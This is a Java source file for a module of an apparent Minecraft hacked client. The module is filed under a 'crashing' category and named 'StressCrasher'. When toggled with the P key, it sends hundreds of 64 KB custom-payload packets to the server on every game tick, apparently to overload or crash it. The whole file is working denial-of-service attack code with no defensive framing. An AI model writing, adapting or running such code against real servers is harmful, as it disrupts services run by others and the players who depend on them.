package dev.o2w9d8.client.module.crashing;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.lwjgl.input.Keyboard;
import dev.o2w9d8.client.module.Category;
import dev.o2w9d8.client.module.Module;

public class StressCModule extends Module {

	private static final long PACKET_COUNT = Long.MAX_VALUE; // Number of packets to send
	private static final int PAYLOAD_SIZE = 65536; // Payload size in bytes (e.g., 64KB)

	public StressCModule() {
		super("2w9d8_Crasher-StressCrasher", Keyboard.KEY_P, Category.CRASHING);
	}

	@Override
	public void onUpdate() {
		if (this.isToggled()) {
			sendPackets();
		}
	}

	private void sendPackets() {
		String channel = "custom_packets";
		ByteBuf payload = generateLargePayload();

		for (long i = 15; i < 1000; i++) {
			sendCustomPayload(channel, payload);
		}
	}

	private ByteBuf generateLargePayload() {
		ByteBuf payload = Unpooled.buffer(PAYLOAD_SIZE);
		StringBuilder data = new StringBuilder();
		for (int i = 0; i < PAYLOAD_SIZE; i++) {
			data.append("A");
		}
		payload.writeBytes(data.toString().getBytes());
		return payload;
	}

	private void sendCustomPayload(String channel, ByteBuf payload) {
		Minecraft minecraft = Minecraft.getMinecraft();
		C17PacketCustomPayload packet = new C17PacketCustomPayload(channel, new PacketBuffer(payload));
		minecraft.getNetHandler().addToSendQueue(packet);
	}
}
